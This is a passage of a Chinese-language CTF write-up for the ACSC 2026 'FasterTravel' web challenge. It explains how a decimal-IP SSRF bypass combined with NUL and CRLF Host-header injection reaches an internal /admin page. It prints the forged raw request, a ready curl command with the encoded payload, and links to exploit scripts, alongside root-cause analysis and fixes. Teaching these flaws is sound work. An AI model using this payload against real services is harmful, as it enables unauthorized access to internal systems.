+<p>它的作用分成两部分：</p>
+<h4 id="a-21307064330-127001">a) <code>2130706433\0</code> 仍然会被解析到 127.0.0.1<a class="headerlink" href="#a-21307064330-127001" title="Permanent link">&para;</a></h4>
+<ul>
+<li>在 glibc / Linux 的解析语义下，<code>getaddrinfo()</code> 在遇到 NUL 时会把主机名当成 <code>2130706433</code></li>
+<li>所以 TCP 实际连到的是本地 <code>127.0.0.1</code></li>
+</ul>
+<h4 id="b-rnhost-localhost-host">b) <code>\r\nHost: localhost</code> 会变成第二个 Host 头<a class="headerlink" href="#b-rnhost-localhost-host" title="Permanent link">&para;</a></h4>
+<ul>
+<li><code>Requester</code> 最终发出去的原始 HTTP 请求类似于：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/admin</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">2130706433\0</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">localhost</span>
+<span class="na">Foo</span><span class="o">:</span> <span class="l">bar</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">fasttravel/0.1</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+<ul>
+<li>而题目自己的 HTTP 服务器会逐行解析 header：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+</code></pre></div>
+<ul>
+<li><code>self.headers</code> 是 <code>CaseInsensitiveDict</code>，重复键会被<strong>后一个覆盖前一个</strong></li>
+<li>所以最终后端看到的 <code>Host</code> 是：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>localhost
+</code></pre></div>
+<ul>
+<li>这样 <code>/admin</code> 的白名单就被绕过了</li>
+</ul>
+<h3 id="4-flag">4. 获取 Flag<a class="headerlink" href="#4-flag" title="Permanent link">&para;</a></h3>
+<ul>
+<li>把上面的 payload 作为 <code>source</code> 提交给 <code>/shorten</code></li>
+<li>服务端返回一个短链接，例如：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>/7khxHS
+</code></pre></div>
+<ul>
+<li>访问预览接口时记得带上 iframe 限制需要的请求头：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="err">Sec-Fetch-Dest: iframe</span>
+<span class="err">Sec-Fetch-Site: same-origin</span>
+</code></pre></div>
+<ul>
+<li>最终 <code>/preview?short=7khxHS</code> 返回：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>Welcome to the secret admin panel! Flag: dach2026{how_is_there_another_forbidden_portal_nq9vcp4ayblyghwy}
+</code></pre></div>
+<h2 id="_3">攻击链/解题流程总结<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>分析 /shorten 与 /admin → 发现 localhost 黑名单只做字符串匹配 → 用 2130706433 绕过 SSRF 黑名单访问 loopback → 再利用 %00 + CRLF 注入伪造第二个 Host: localhost → 让 /admin 白名单放行 → 通过 /preview 读回内部响应 → Flag
+</code></pre></div>
+<h2 id="_4">漏洞分析 / 机制分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="_5">根因<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ul>
+<li>SSRF 防护只做了<strong>主机名字面字符串比较</strong></li>
+<li>自定义 <code>urlparse()</code> 允许异常主机名进入后续逻辑</li>
+<li>内部请求构造时把 <code>hostname</code> 原样拼进 <code>Host:</code> 头，导致 CRLF 头注入</li>
+<li>自定义 HTTP 服务器对重复 <code>Host</code> 头采用“后写覆盖前写”，进一步放大问题</li>
+</ul>
+<h3 id="_6">影响<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<ul>
+<li>攻击者可 SSRF 到本地回环地址</li>
+<li>攻击者可伪造内部请求头，使本地受信任接口误以为请求来自白名单 Host</li>
+<li>本题中直接拿到 <code>/admin</code> 返回的 flag</li>
+</ul>
+<h3 id="_7">修复建议（适用于漏洞类题目）<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<ul>
+<li>SSRF 防护不能只看主机字符串，应在解析后对实际 IP 做校验，禁止回环、内网和链路本地地址</li>
+<li>不要自己手写 URL 解析器和 HTTP 解析器，应使用成熟标准库</li>
+<li>构造 HTTP 请求时必须拒绝 <code>\r</code>、<code>\n</code>、<code>\0</code> 等控制字符</li>
+<li>后端不应仅依赖 <code>Host</code> 头做“敏感接口信任判断”</li>
+</ul>
+<h2 id="_8">知识点<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ul>
+<li>SSRF localhost / loopback 黑名单绕过</li>
+<li>CRLF 注入与 Host 头注入</li>
+<li>重复请求头覆盖行为</li>
+</ul>
+<h2 id="_9">使用的工具<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Python 标准库 <code>urllib</code> — 提交 <code>/shorten</code>、获取短链与 <code>/preview</code></li>
+<li>本地源码阅读 — 分析手写 <code>urlparse()</code>、<code>Requester</code>、<code>CaseInsensitiveDict</code></li>
+<li>Docker / 本地复现 — 还原并验证 <code>%00 + CRLF</code> 的请求效果</li>
+</ul>
+<h2 id="_10">脚本归档<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Go：<a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/ACSC2026Qualification_FasterTravel.go" target="_blank"><code>ACSC2026Qualification_FasterTravel.go</code> <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3m-2 16H5V5h7V3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7h-2z"/></svg></span></a></li>
+<li>Python：<a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/ACSC2026Qualification_FasterTravel.py" target="_blank"><code>ACSC2026Qualification_FasterTravel.py</code> <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3m-2 16H5V5h7V3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7h-2z"/></svg></span></a></li>
+<li>说明：两个脚本都会直接发送<strong>预编码的原始 form body</strong>，避免普通 urlencode 把空格编码成 <code>+</code> 导致注入失败</li>
+</ul>
+<h2 id="gui">命令行提取关键数据（无 GUI）<a class="headerlink" href="#gui" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>go<span class="w"> </span>run<span class="w"> </span>CTF_Writeups/scripts_go/ACSC2026Qualification_FasterTravel.go<span class="w"> </span>-base<span class="w"> </span>https://4ty7qe174n8cri3w.dyn.acsc.land
+
+python<span class="w"> </span>CTF_Writeups/scripts_python/ACSC2026Qualification_FasterTravel.py<span class="w"> </span>--base<span class="w"> </span>https://4ty7qe174n8cri3w.dyn.acsc.land
+
+curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://4ty7qe174n8cri3w.dyn.acsc.land/shorten<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--data-binary<span class="w"> </span><span class="s1">&#39;source=http://2130706433%00%0d%0aHost:%20localhost%0d%0aFoo:%20bar:5001/admin&#39;</span>
+</code></pre></div>
+<h2 id="_11">推荐工具与优化解题流程<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>参考 <code>CTF_TOOLS_EXTENSION_PLAN.md</code> 中的对应类别工具推荐。</p>
+</blockquote>
+<h3 id="_12">工具对比总结<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>适用阶段</th>
+<th>本题耗时</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Python 标准库脚本</td>
+<td>完整利用</td>
+<td>秒级</td>
+<td>最适合快速验证原始 body 与预览读取</td>
+<td>需要自己处理 redirect 与 header</td>
+</tr>
+<tr>
+<td>Go 标准库脚本</td>
+<td>完整利用</td>
+<td>秒级</td>
+<td>单文件归档方便，适合长期保留</td>
+<td>代码量略大于 curl</td>
+</tr>
+<tr>
+<td>curl</td>
+<td>手工验证</td>
+<td>秒级</td>
+<td>能精确控制原始 <code>--data-binary</code></td>
+<td>预览阶段还要再补请求头</td>
+</tr>
+<tr>
+<td>Docker 本地复现</td>
+<td>机制验证</td>
+<td>分钟级</td>
+<td>能完整观察原始请求与后端解析行为</td>
+<td>比比赛时直接打靶慢</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_13">推荐流程<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p><strong>推荐流程</strong>：先读源码确认 SSRF 黑名单与 Host 白名单逻辑 → 选用 <code>2130706433</code> 绕过 loopback 限制 → 再用 <code>%00 + %0d%0aHost:%20localhost</code> 注入第二个 Host 头 → 通过 <code>/preview</code> 读取内部 <code>/admin</code> 响应 → Flag。 </p>
+<h3 id="a">工具 A（推荐首选）<a class="headerlink" href="#a" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>安装</strong>：Python 3.10+</li>
+<li><strong>详细步骤</strong>：</li>
+<li>构造预编码 <code>source=</code> body</li>
+<li>POST 到 <code>/shorten</code></li>
+<li>取出跳转短码</li>
+<li>带 iframe 所需请求头访问 <code>/preview</code></li>
+<li><strong>优势</strong>：流程自动化程度高，最适合保留为可复现脚本</li>
+</ul>
+<h3 id="b">工具 B（可选）<a class="headerlink" href="#b" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>安装</strong>：系统自带 <code>curl</code></li>
+<li><strong>详细步骤</strong>：</li>
+<li>用 <code>--data-binary</code> 发送原始 body，确保 <code>%20</code> 不被改写为 <code>+</code></li>
+<li>记录返回的短链接</li>
+<li>再请求 <code>/preview?short=...</code> 并补上 <code>Sec-Fetch-*</code> 头</li>
+<li><strong>优势</strong>：最方便调试原始请求细节，适合比赛现场快速验证</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="__comments">评论</h2>
+
+<script
+  src="https://giscus.app/client.js"
+  data-repo="your-username/your-repo"
+  data-repo-id=""
+  data-category="Writeup Comments"
+  data-category-id=""
+  data-mapping="pathname"
+  data-strict="1"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="top"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  data-loading="lazy"
+  crossorigin="anonymous"
+  async>
+</script>
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.path", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../javascripts/drawer-backdrop.js"></script>
+      
+    
+  </body>
+</html>
